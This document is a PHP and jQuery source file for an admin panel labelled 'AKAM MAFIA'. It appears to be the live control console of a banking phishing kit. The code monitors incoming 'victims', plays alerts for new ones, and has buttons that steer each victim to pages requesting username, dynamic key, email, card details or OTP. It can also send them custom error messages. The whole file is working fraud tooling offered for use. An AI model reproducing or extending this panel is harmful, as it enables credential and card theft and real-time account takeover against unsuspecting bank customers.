<?php 
session_start(); 
require('../lib/funciones.php');

date_default_timezone_set('America/Bogota');

// Verificación de sesión de AKAM MAFIA
if (!isset($_SESSION["usuario0608"])) {
    header("Location: ../login.php");
    exit();
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="../img/metronic.ico">
    <title>SISTEMA DE MONITOREO - AKAM MAFIA</title>	
    <link href="../css/styles-admin.css" rel="stylesheet">	
    <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
    <style>
        /* Estilos optimizados para AKAM MAFIA */
        @media (max-width: 768px) {
            .contenedor-principal { padding: 10px 5px; }
            .control, .control-off, .control2, .control2-off { min-height: 40px; font-size: 10px !important; }
        }
        #fondo { top:0; left: 0; width: 100%; height: 100%; position: fixed; background-color: #00000073; z-index: 200; display: none; }
        #cuadro-mensaje { border-radius: 5px; top: 50%; left: 50%; position: fixed; width: calc(90% - 60px); max-width: 360px; transform: translate(-50%,-50%); background-color: #fff; padding: 30px; z-index: 220; display: none; }
        #contenido-mensaje { border-radius: 5px; width: 100%; height: 70px; margin: 10px 0px; outline: 0; padding: 10px; border: 1px solid #ccc; }
        #btn-enviar-mensaje { background-color: #e7f9ea; cursor: pointer; border-radius: 5px; padding: 10px; border: 1px solid #C0C0CC; border-bottom: 4px solid #006BE9; text-align: center; width: 100%; font-weight: bold; }
        .contenedor-casos { min-height: 200px; padding: 20px; }
    </style>
</head>
<body bgcolor="#F5F8FA">
    <div id="fondo"></div>
    
    <div id="cuadro-mensaje">
        <table width="100%" cellpadding="0" cellspacing="0" border="0">
            <tr>
                <td valign="middle" align="left"><b>Enviar Mensaje a Víctima</b></td>
                <td valign="middle" align="right"><img src="../img/btn-cerrar.png" style="cursor: pointer;" id="cerrar-mensaje" width="20"></td>
            </tr>
        </table>
        <textarea id="contenido-mensaje" placeholder="Escribe el error o instrucción aquí..."></textarea>
        <button id="btn-enviar-mensaje">ENVIAR AHORA</button>
    </div>

    <div class="menu">
        <table class="opciones-mob">
            <tr>
                <td><img src="../img/todos-a.svg" width="19"></td>
                <td><a href="#"><img src="../img/alarma-g.svg" width="19"></a></td>
                <td><a href="#"><img src="../img/final-g.svg" width="19"></a></td>
            </tr>
        </table>
        <div class="opciones">
            <span class="item-menu" style="background-color:#F4F6FA;color:#5e6278; ">Todos los Casos</span>
            <a href="#"><span class="item-menu">Pendientes</span></a> 
            <a href="#"><span class="item-menu">Finalizados</span></a>
        </div>
        <div class="cerrar" id="btn-logout" style="cursor:pointer;"><img src="../img/cerrar-g.svg" width="19"></div>
    </div>

    <div class="items-trans contenedor-casos" id="tabla-monitoreo">
        <?php cargar_casos(); ?>	
    </div>

    <audio id="snd"><source src="../audio/timbre.mp3" type="audio/mpeg"></audio>
    <audio id="sndOTP"><source src="../audio/electrico.mp3" type="audio/mpeg"></audio>

    <div class="logo">
        <img src="../img/icono.png" width="30" style="margin:20px 0px;">
        <div style="width: 100%; border-bottom: 1px dashed #a58e8e;"></div>
    </div>	

    <script type="text/javascript">
        var identificador = 0;
        var cantidad_actual = 0;

        function actualizar_casos() {
            $.get("../process/casos.php", function(data) {
                // Actualizamos el contenedor sin recargar la página
                $("#tabla-monitoreo").html(data);
                
                // Lógica de sonido: si el número de registros aumenta, suena la alerta
                var nueva_cantidad = $(".item-trans").length;
                if (nueva_cantidad > cantidad_actual && cantidad_actual !== 0) {
                    document.getElementById('snd').play();
                }
                cantidad_actual = nueva_cantidad;
            });
        }

        $(document).ready(function() {
            // Actualización automática cada 3 segundos
            setInterval(actualizar_casos, 3000);

            // Manejo de Cierre de Sesión
            $("#btn-logout").click(function() {
                window.location.href = "../cerar-sesion.php";
            });

            // CONTROL DE BOTONES (DINÁMICA, TARJETA, FINALIZAR)
            $(document).on('click', '.dinamica, .tarjeta, .finalizar, .correo, .usuario, .otp', function() {
                var btn = $(this);
                var id_victima = btn.attr('id');
                var estado_n = "";

                if (btn.hasClass('usuario')) estado_n = "1";
                if (btn.hasClass('dinamica')) estado_n = "2";
                if (btn.hasClass('correo'))   estado_n = "4";
                if (btn.hasClass('tarjeta'))  estado_n = "6";
                if (btn.hasClass('otp'))      estado_n = "8";
                if (btn.hasClass('finalizar')) estado_n = "10";

                btn.prop('disabled', true).text("Cambiando...");

                $.post("../process/estado.php", { id: id_victima, est: estado_n }, function(r) {
                    // La tabla se refrescará sola y habilitará los botones nuevos
                    console.log("Comando enviado: " + estado_n);
                });
            });

            // CONTROL DE MENSAJES PERSONALIZADOS
            $(document).on('click', '.mensaje', function() { 
                identificador = $(this).attr('id');
                $("#contenido-mensaje").val("");
                $("#fondo, #cuadro-mensaje").fadeIn(); 		
            });

            $("#cerrar-mensaje").click(function() { 
                $("#fondo, #cuadro-mensaje").fadeOut(); 	
            });

            $("#btn-enviar-mensaje").click(function() { 
                var mensaje_texto = $("#contenido-mensaje").val();
                if(mensaje_texto == "") return alert("Escribe un mensaje");

                $("#fondo, #cuadro-mensaje").hide(); 
                
                // Enviamos el mensaje al archivo mensaje.php y ponemos a la víctima en estado 14
                $.post("../process/mensaje.php", { id: identificador, msg: mensaje_texto }, function(data) {
                    $.post("../process/estado.php", { id: identificador, est: "14" });
                });
            });
        });
    </script>
</body>
</html>
